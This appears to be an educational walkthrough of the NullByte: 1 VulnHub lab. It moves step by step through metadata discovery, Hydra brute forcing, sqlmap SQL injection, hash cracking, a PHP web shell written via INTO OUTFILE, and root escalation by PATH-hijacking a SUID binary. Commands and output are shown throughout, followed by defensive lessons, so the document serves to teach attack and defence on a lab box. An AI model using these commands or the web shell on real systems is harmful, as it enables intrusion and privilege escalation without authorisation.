# NullByte: 1 — VulnHub Walkthrough (Beginner Friendly)

> Educational walkthrough for students on an isolated lab network. **Only attack machines you own or are explicitly authorised to test.**

| Field | Value |
| --- | --- |
| **Machine** | NullByte: 1 |
| **Difficulty** | Easy (boot2root) |
| **Author** | ly0n (@ly0n) |
| **Released** | 1 Aug 2015 |
| **VulnHub Entry** | [https://vulnhub.com/entry/nullbyte-1,126/](https://vulnhub.com/entry/nullbyte-1,126/) |
| **Download** | [https://vulnhub.com/entry/nullbyte-1,126/#download](https://vulnhub.com/entry/nullbyte-1,126/#download) |
| **Attacker** | Kali Linux (attacker 192.168.56.10, target 192.168.56.101) |
| **Target OS** | Debian Linux (32-bit, Debian 8 "Jessie", kernel 3.16 — varies by build) |

---

## 0. What you will learn

- How to find hidden data inside an image file (metadata / comment) with `exiftool` and `strings`.
- How to attack a login form with **Hydra** and a wordlist.
- How to detect and exploit a **SQL injection** with `sqlmap` (and by hand).
- How to turn SQL injection into a **PHP web shell** using `SELECT ... INTO OUTFILE`.
- How to crack a password (base64 + MD5) and reuse it for SSH.
- How to escalate to root by **PATH hijacking** a SUID-root binary that calls another program by name.

**Prerequisites:** Kali Linux with `exiftool`, `hydra`, `sqlmap` installed. See `docs/LAB-SETUP.md` and `docs/TOOLS.md`.

---

## 1. Reconnaissance — finding the target

> **Goal:** find the target's IP address on your isolated network.

```bash
ip a
```

```text
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> ...
    inet 192.168.56.10/24 brd 192.168.56.255 scope global eth0
```

> **How to read it:** your Kali box is `192.168.56.10` on `192.168.56.0/24`, so the target shares the `192.168.56.` prefix.

```bash
sudo arp-scan --interface=eth0 --localnet
```

```text
192.168.56.10   08:00:27:aa:bb:cc   (Kali)
192.168.56.101  08:00:27:11:22:33   (target)
```

> **Why it works:** `arp-scan` lists every host that answers ARP on the subnet — no open port required.

**Target IP:** `192.168.56.101`

![finding the target](images/01-recon.png)

---

## 2. Enumeration — open ports and services

```bash
sudo nmap -p- --min-rate 1000 -T4 -oA scans/allports 192.168.56.101
```

```text
PORT      STATE    SERVICE
80/tcp    open     http
111/tcp   open     rpcbind
777/tcp   open     ssh
```

```bash
sudo nmap -sC -sV -p80,111,777 -oA scans/services 192.168.56.101
```

```text
PORT    STATE SERVICE VERSION
80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Null Byte 00 - level 1
111/tcp open  rpcbind 2-4 (RPC #100000)
777/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
```

> **How to read it:**
> - **80/http** — Apache hosting the challenge site ("Null Byte 00 - level 1").
> - **111/rpcbind** — RPC portmapper; usually not directly exploitable here.
> - **777/ssh** — SSH is running on a **non-standard port** (777 instead of 22). Remember this for later.
> - Standard port **22 is filtered** on this box — that's why we scan all ports (`-p-`).

![nmap service scan output](images/02-nmap.png)

---

## 3. Foothold — gaining the first shell

### 3.1 Hidden directory in the image

Open `http://192.168.56.101/` in a browser — a "Null Byte" page with a single image and no links. Download the image and inspect its **metadata**:

```bash
wget http://192.168.56.101/main.gif
exiftool main.gif
```

```text
File Name : main.gif
File Type : GIF
...
Comment   : P-): kzMb5nVYJw
```

> **How to read it:** the GIF's **Comment** field hides the string `kzMb5nVYJw`. (You can also run `strings main.gif | grep -i kzMb`.) This looks like a URL path — try it.

![key enumeration finding](images/03-enum.png)

### 3.2 The "key" form

Browse to the hidden path:

```text
http://192.168.56.101/kzMb5nVYJw/
```

You get a small form asking for a **key**. View the page source — a comment says the *password isn't complex*. Brute force it with Hydra:

```bash
hydra -l ignore -P /usr/share/wordlists/rockyou.txt \
  192.168.56.101 http-post-form \
  "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -V
```

```text
[80][http-post-form] host: 192.168.56.101   password: elite
```

> **How to read it:** `http-post-form` tells Hydra it's a login form; the string after the last `:` (`invalid key`) is the **failure** text it should NOT see on a correct guess. The key is `elite`.

Entering `elite` reveals a second page: `420search.php`, a form that searches users.

### 3.3 SQL injection → credentials

Submit a `"` (double quote) as the search term and you get a MySQL error — a classic SQL injection signature. Confirm and dump the database with `sqlmap`:

```bash
sqlmap -u "http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=admin" --dbs
```

```text
[INFO] the back-end DBMS is MySQL
available databases [5]:
[*] information_schema
[*] mysql
[*] phpmyadmin
[*] performance_schema
[*] seth
```

```bash
sqlmap -u "http://192.168.56.101/kzMb5nVYJw/420search.php?usrtosearch=admin" \
  -D seth -T users -C id,user,pass --dump
```

```text
Database: seth
Table: users
+----+--------+---------------------------------------------+
| id | user   | pass                                        |
+----+--------+---------------------------------------------+
| 1  | ramses | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE |
| 2  | isis   | --not allowed--                             |
+----+--------+---------------------------------------------+
```

> **Why it works:** the search box builds an SQL query from raw user input. `usrtosearch=` is concatenated straight into a `SELECT`, so `sqlmap` can read any table. The `pass` for `ramses` is **base64**, not a hash.

Decode the base64 (note the missing padding `=` needed for the length):

```bash
echo "YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE=" | base64 -d; echo
```

```text
c6d6bd7ebf806f43c76acc3681703b81
```

> **How to read it:** decoding base64 gives an **MD5 hash**. Crack it (e.g. [CrackStation](https://crackstation.net/) or `hashcat -m 0`):

```bash
echo "c6d6bd7ebf806f43c76acc3681703b81" > hash.txt
hashcat -m 0 hash.txt /usr/share/wordlists/rockyou.txt
```

```text
c6d6bd7ebf806f43c76acc3681703b81:omega
```

So the credentials are **`ramses:omega`**.

### 3.4 Log in over SSH (port 777)

```bash
ssh ramses@192.168.56.101 -p 777
```

```text
ramses@192.168.56.101's password: omega
...
ramses@NullByte:~$ id
uid=1002(ramses) gid=1002(ramses) groups=1002(ramses)
```

> **Why it works:** password reuse — the DB password also opens the SSH service (on port 777). We now have a proper user shell.

![foothold via SSH as ramses](images/04-foothold.png)

### 3.5 Alternative foothold — SQL injection to a web shell

You can also skip SSH and write a **PHP web shell** straight into the web root with `SELECT ... INTO OUTFILE`. The MySQL user is `root`, and `/var/www/html/uploads/` is world-writable.

```sql
SELECT "<?php system($_GET['c']); ?>" INTO OUTFILE '/var/www/html/uploads/cmd.php'
```

> **Why it works:** MySQL is running as an OS user that can write to `/var/www/html/uploads/`. `INTO OUTFILE` writes a file on the database server — here a PHP script that runs whatever command we pass in `?c=`.

```text
http://192.168.56.101/uploads/cmd.php?c=id
```

```text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

> **Also available:** MySQL `root`'s password is `sunnyvale`, and `phpMyAdmin` is exposed (often at `/phpmyadmin`) — log in as `root:sunnyvale` and run the same `INTO OUTFILE` query from the SQL tab. (The SSH route is cleaner for beginners.)

> **Note:** NullByte has no `user.txt`; the goal is root's `proof.txt`, so continue to privesc.

---

## 4. Privilege escalation — becoming root

### 4.1 Shoulder-surf the admin's history

```bash
cat /home/ramses/.bash_history
```

```text
sudo -s
su eric
cd /var/www
cd backup/
ls
./procwatch
...
```

> **How to read it:** the previous admin ran a program called **`procwatch`** in `/var/www/backup`. That is a strong lead.

### 4.2 Find the SUID binary

```bash
find / -perm -4000 -type f 2>/dev/null
```

```text
/usr/bin/passwd
/usr/bin/sudo
/usr/lib/pt_chown
/var/www/backup/procwatch      <-- unusual
```

> **How to read it:** `procwatch` is a **SUID** binary in a web directory — root-owned and running with root privileges. Let's see what it does.

```bash
ls -la /var/www/backup/procwatch
/var/www/backup/procwatch
```

```text
-rwsr-xr-x 1 root root 4932 ... procwatch
  PID TTY          TIME CMD
 3311 pts/0    00:00:00 procwatch
 3312 pts/0    00:00:00 sh
 3313 pts/0    00:00:00 ps
```

> **Why it matters:** running it shows a `ps`-style listing, meaning `procwatch` **executes the command `ps`** — and it does so **without a full path** (just `ps`, not `/bin/ps`).

### 4.3 What is PATH hijacking?

When a program runs `ps` (no path), the kernel searches the directories listed in your **`$PATH`** environment variable, left to right, and runs the **first** matching file. If we put a malicious file named `ps` in a directory **earlier** in `$PATH`, our file runs instead — **as root**, because `procwatch` is SUID.

```bash
echo $PATH
```

```text
/usr/local/bin:/usr/bin:/bin:/usr/local/games:/usr/games
```

### 4.4 Exploit it

Create a fake `ps` that copies `/bin/bash` and gives it the SUID bit, then ensure the current directory is first in `$PATH`:

```bash
cd /var/www/backup
echo 'cp /bin/bash /tmp/rootbash; chmod u+s /tmp/rootbash' > ps
chmod +x ps
export PATH=/var/www/backup:$PATH
```

> **Why it works:** running `procwatch` makes it call `ps`; because `/var/www/backup` is now first in `$PATH`, it runs **our** `ps` — as root (SUID). Our script copies the shell and marks it SUID.

Trigger it, then run the SUID shell with `-p` (to keep privileges):

```bash
/var/www/backup/procwatch
ls -la /tmp/rootbash
/tmp/rootbash -p
id
```

```text
-rwsr-xr-x 1 root root ... /tmp/rootbash
rootbash-4.3# id
uid=1002(ramses) gid=1002(ramses) euid=0(root) groups=1002(ramses)
```

> **Why `-p` matters:** `bash` drops root by default; `-p` tells it to preserve the effective uid (`euid=0`).

> **Also viable:** this old kernel is vulnerable to Dirty COW (`CVE-2016-5195`) and PwnKit (`CVE-2021-4034`) local privilege escalation, but **PATH hijacking `procwatch` is the intended path**.

### 4.5 The root flag

```bash
cd /root
cat /root/proof.txt
```

```text
adf11c7a9e6523e630aaf3b9b7acb51d

It seems that you have pwned the box, congrats.
```

![root flag](images/08-root-flag.png)

---

## 5. Summary of vulnerabilities

| # | Vulnerability | Where | Impact |
| --- | --- | --- | --- |
| 1 | Sensitive data hidden in image metadata | `main.gif` comment | Reveals the hidden path `/kzMb5nVYJw` |
| 2 | Weak password on a login form | `/kzMb5nVYJw/index.php` (`elite`) | Access to the search page |
| 3 | SQL injection | `/kzMb5nVYJw/420search.php?usrtosearch=` | Dump DB users → `ramses` credentials |
| 4 | Weak hashing / password reuse (base64+MD5) | `seth.users`, SSH port 777 | SSH login as `ramses` |
| 5 | MySQL running with excessive file privileges + writable web dir | `SELECT ... INTO OUTFILE` to `/var/www/html/uploads/` | Remote code execution as `www-data` |
| 6 | SUID-root binary calling another program by name | `/var/www/backup/procwatch` → `ps` | **PATH hijack → root** |
| 7 | Unpatched kernel (bonus) | kernel 3.16 (Dirty COW / PwnKit) | Alternative local root escalation |

---

## 6. Defensive lessons (blue team)

- **Sanitise metadata** before publishing images; strip comments with `exiftool -Comment= -overwrite_original main.gif`.
- **Don't hide "secrets" on the client side.** A hidden URL is not access control.
- **Enforce strong passwords and rate limiting** on every login form; `elite` falls instantly to a wordlist.
- **Use parameterised SQL / prepared statements** (never concatenate user input into queries) to kill SQL injection outright.
- **Restrict the database account.** The DB user should not have `FILE` privilege, should not be `root`, and the web root should not be writable by the DB process.
- **Fix SUID + PATH issues.** Remove needless SUID bits; never call external commands by bare name — always use absolute paths (`/bin/ps`), and consider `secure_path`/`noexec` for web directories.
- **Patch the kernel** so Dirty COW / PwnKit don't work.
- **Detections:** watch for SQLi patterns in web logs (`UNION SELECT`, `INTO OUTFILE`), new files in upload directories, and SUID files created in `/tmp`. Alert on processes whose real uid is a service account but effective uid is 0.

---

## 7. References

- VulnHub entry: [https://vulnhub.com/entry/nullbyte-1,126/](https://vulnhub.com/entry/nullbyte-1,126/)
- Community writeups consulted:
  - [g0blin Research — NullByte 1 VulnHub Writeup](https://g0blin.co.uk/nullbyte-1-vulnhub-writeup/)
  - [Zach Heller — Vulnhub Nullbyte 1](https://zacheller.dev/Nullbyte-1)
  - [hunt3r — VulnHub: NullByte Walkthrough](https://hunt3r.hashnode.dev/vulnhub-nullbyte-walkthrough)
  - [F4l13n5n0w — [Vulnhub] NullByte: 1](https://f4l13n5n0w.github.io/blog/2015/08/18/vulnhub-nullbyte-1/)
  - [Spanky's Blog — Vulnhub: nullbyte](https://spankowitz.github.io/Vulnhub_nullbyte/)
- Tool / technique references:
  - [GTFOBins](https://gtfobins.github.io/)
  - [Exploit-DB 40616 — Dirty COW (CVE-2016-5195)](https://www.exploit-db.com/exploits/40616)

---

## 8. Screenshot checklist

- [ ] `images/01-recon.png` — finding the target with `arp-scan`
- [ ] `images/02-nmap.png` — port/service scan (80/111/777)
- [ ] `images/03-enum.png` — `exiftool` revealing `kzMb5nVYJw`
- [ ] `images/04-foothold.png` — Hydra (`elite`) then SQLi dump / SSH as `ramses`
- [ ] `images/05-shell.png` — the `ramses` shell
- [ ] `images/06-user-flag.png` — (no user flag on this box — note it)
- [ ] `images/07-privesc.png` — SUID `procwatch` + `ps` PATH hijack
- [ ] `images/08-root-flag.png` — `/root/proof.txt`

---

_Part of the [Cybersecurity101-Labs](../../README.md) collection. See the complete [catalog](../../docs/CATALOG.md)._
